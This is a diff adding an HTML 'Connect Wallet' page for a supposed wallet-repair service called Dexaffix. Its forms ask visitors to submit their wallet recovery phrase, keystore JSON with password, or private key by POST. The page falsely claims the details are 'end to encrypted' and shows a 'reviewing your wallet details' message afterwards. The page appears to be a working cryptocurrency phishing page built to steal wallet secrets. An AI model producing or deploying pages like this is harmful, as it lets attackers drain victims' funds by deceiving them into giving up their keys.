@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Connect | Wallet</title>
+	<meta charset="UTF-8">
+	<meta name="description" content="Dexaffix is a decentralized automatic network service provider run by bots">
+	<meta name="keywords" content="cryptocurrency, Dexaffix, creative">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<!-- Favicon -->
+	<link href="favicon.ico" rel="shortcut icon"/>
+
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
+
+	<!-- Stylesheets -->
+	<link rel="stylesheet" href="css/bootstrap.min.css"/>
+	<link rel="stylesheet" href="css/font-awesome.min.css"/>
+	<link rel="stylesheet" href="css/themify-icons.css"/>
+	<link rel="stylesheet" href="css/owl.carousel.css"/>
+	<link rel="stylesheet" href="css/style.css"/>
+    <link rel="stylesheet" href="css/main.css" type="text/css"> 
+	<link rel="stylesheet" href="css/popup.css" type="text/css"> 
+
+	<!--[if lt IE 9]>
+	  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+	  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+	<![endif]-->
+
+	<script>
+        function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+  }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+  }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+}
+
+</script>
+
+</head>
+<body>
+	<!-- Page Preloder -->
+	<div id="preloder">
+		<div class="loader"></div>
+	</div>
+
+	<!-- Header section -->
+	<header class="header-section clearfix">
+		<div class="container-fluid">
+			<a href="/" class="site-logo">
+				<img src="img/logo.png" alt="">
+			</a>
+			<div class="responsive-bar"><i class="fa fa-bars"></i></div>
+			<a href="#connect" class="user">Connect wallet</a>
+			<!-- <a href="#connect" class="site-btn">Connect wallet</a> -->
+			<nav class="main-menu">
+				<ul class="menu-list">
+					<li><a href="/">Fix wallet</a></li>
+					<li><a href="scan-wallet">Scan wallet</a></li>
+					<li><a href="/">How it works</a></li>
+					<li><a href="/">News</a></li>
+				</ul>
+			</nav>
+		</div>
+	</header>
+	<!-- Header section end -->
+
+
+
+	<!-- Page info section -->
+	<section class="page-info-section">
+		<div class="container">
+			<h2>Connect Wallet</h2>
+			<div class="site-beradcamb">
+				<a href="/">Home</a>
+				<span><i class="fa fa-angle-right"></i> Connect Wallet</span>
+			</div>
+		</div>
+	</section>
+	<!-- Page info end -->
+
+
+
+	<!-- Contact section -->
+	<section class="contact-page spad">
+		<div class="container" id="connect">
+			<div class="field">
+				<center>
+					<label><strong>What problem are you facing with wallet<span style="color: red;"> *</span> </strong> </label>
+					<select  id="country-select" name="select" class="form-control">
+						<option  value="Afghanistan">Select problem with wallet...</option>
+													<option  value="">Wallet Loads slowly</option>
+													<option  value="">Can't connect wallet</option>
+													<option  value="">Can't perform transactions with wallet</option>
+													<option  value="">Wallet is suspened</option>
+													<option  value="">Pending transactions</option>
+													<option  value="">Irregular gas fees</option>
+													<option  value="">Unable to add network</option>
+													<option  value="">Network Rpc issues</option>
+													<option  value="">None</option>
+						</select>
+				</center>
+			</div>
+			<br>
+			<div class="field">
+				<center>
+					<label><strong>If you select none enter the wallet problem here(optional)</strong> </label>
+					<input type="text" placeholder="what problem are you facing" class="form-control">
+				</center>
+			</div>
+			<br>
+			<div class="tab">
+			  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)"><strong>PHRASE</strong></button>
+			  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)"><strong>KEYSTORE JSON</strong></button>
+			  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)"><strong>PRIVATE KEY</strong></button>
+		  </div>
+		  <center>
+			<div id="phrase" class="tabcontent" style="display: block;">
+				<form method="POST">				
+					<textarea id="phrase-text"  name="phrase" class="phrase" minlength="12" placeholder="Phrase"></textarea>
+					<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+					<div class="desc">Wallet details is end to encrypted <a href="#" style="text-decoration: underline;">learn more</a></div>
+					<br>
+					<p id="error-phrase-wallet" style="color: red; display: none;">Enter wallet phrase.</p>
+					<br>
+					<input type="submit" class="btn" id="phrase-btn" value="CONNECT">
+				</form>
+			</div>
+		  </center>
+					
+				<center>
+					<div id="keystore" class="tabcontent" style="display: none;">
+						<form method="POST">				
+							<textarea name="keystorejson" id="keystore-text" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+							<br>
+				
+							<div class="field">
+								<input type="password" id="keystore-password" name="password" placeholder="Password">
+							</div>
+							<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+							<div class="desc">Wallet details is end to encrypted <a href="#" style="text-decoration: underline;">learn more</a></div>
+
+							<br>
+							<p id="error-key-store-wallet" style="color: red; display: none;">Wallet key-store or password missing.</p>
+							<br>
+							<input type="submit" class="btn" id="keystore-btn" value="CONNECT">
+						</form>
+					</div>
+				</center>
+					
+				<center>
+					<div id="private" class="tabcontent" style="display: none;">
+						<form method="POST">
+							<div class="field">
+								<input type="text" id="private-key-text" name="key" class="key" placeholder="Private Key">
+							</div>
+							<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+							<div class="desc">Wallet details is end to encrypted <a href="#" style="text-decoration: underline;">learn more</a></div>
+							<br>
+							<p id="error-private-key-wallet" style="color: red; display: none;">Enter wallet private key.</p>
+							<br>
+							<input type="submit" class="btn" id="private-key-btn" value="CONNECT">
+						</form>
+					</div>
+				</center>
+				
+					
+		</div>
+	</section>
+	<script>
+        document.getElementById("default").click();
+    </script>
+	
+    
+        
+	<!-- Newsletter section -->
+	<section class="newsletter-section gradient-bg">
+		<div class="container text-white">
+			<div class="row">
+				<div class="col-lg-7 newsletter-text">
+					<h2>Subscribe to our Newsletter</h2>
+					<p>Sign up for our weekly crypto updates, insider perspectives and common wallet problems.</p>
+				</div>
+				<div class="col-lg-5 col-md-8 offset-lg-0 offset-md-2">
+					<form class="newsletter-form">
+						<input type="text" placeholder="Enter your email">
+						<button>Get Started</button>
+					</form>
+				</div>
+			</div>
+		</div>
+	</section>
+	<!-- Newsletter section end -->
+
+	<div class="container">
+		<div class="modal fade" id="Mymodal">
+			<div class="modal-dialog modal-dialog-centered" role="document">
+				<div class="modal-content">
+					<div class="modal-header">
+						<h5 class="modal-title">Success</h5>
+						<button id="modal-close" type="button" class="close" data-dismiss="modal"><span>&times;</span></button>
+					</div>
+					<div class="modal-body">
+						<div class="row"> 
+							<div class="col-lg-12">
+								<h5 class="text-black">We are currently reviewing your wallet details.</h5>
+							</div>
+							<br>
+							<br>
+							<br>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	 </div>
+
+
+	<!-- Footer section -->
+	<footer class="footer-section">
+		<div class="container">
+			<div class="row spad">
+				<div class="col-md-6 col-lg-3 footer-widget">
+					<img src="img/logo.png" class="mb-4" alt="">
+					<span><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
+Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved <i class="fa fa-heart-o" aria-hidden="true"></i><a href="/" target="_blank"></a>
+<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></span>
+				</div>
+				<div class="col-md-6 col-lg-2 offset-lg-1 footer-widget">
+					<h5 class="widget-title">Resources</h5>
+					<ul>
+						<li><a href="#">Faq</a></li>
+						<li><a href="#">Wallet Overview</a></li>
+						<li><a href="#news">Blog News</a></li>
+						<li><a href="https://www.wikihow.com/Make-a-Wallet#:~:text=1%20Cut%20out%20a%20paper%20pattern%20for%20your,stitch%20to%20sew%20the%20wallet%20body%20in%20half." target="_blank">How to Create your own wallet</a></li>
+					</ul>
+				</div>
+				<div class="col-md-6 col-lg-2 offset-lg-1 footer-widget">
+					<h5 class="widget-title">Quick Links</h5>
+					<ul>
+						<li><a href="https://www.coinbase.com/learn/crypto-basics/what-is-a-crypto-wallet" target="_blank">What is a crypto wallet</a></li>
+						<li><a href="#">Wallet Provider</a></li>
+						<li><a href="#">Governance</a></li>
+						<li><a href="https://coinmarketcap.com/rankings/exchanges/" target="_blank">Exchange Markets</a></li>
+					</ul>
+				</div>
+			</div>
+			<div class="footer-bottom">
+				<div class="row">
+					<div class="col-lg-8 text-center text-lg-right">
+						<ul class="footer-nav">
+							<li><a href="">DPA</a></li>
+							<li><a href="">Terms of Use</a></li>
+							<li><a href="">Privacy Policy </a></li>
+							<li><a href="">support@Dexaffix.com</a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+	</footer>
+
+	<!--====== Javascripts & Jquery ======-->
+	<script src="js/jquery-3.2.1.min.js"></script>
+	<script src="assets/vendor/bootstrap/js/bootstrap.bundle.js"></script>
+	<script src="js/owl.carousel.min.js"></script>
+	<script src="js/main.js"></script>
+	<script src="js/popup.js"></script>
+</body>
+</html>
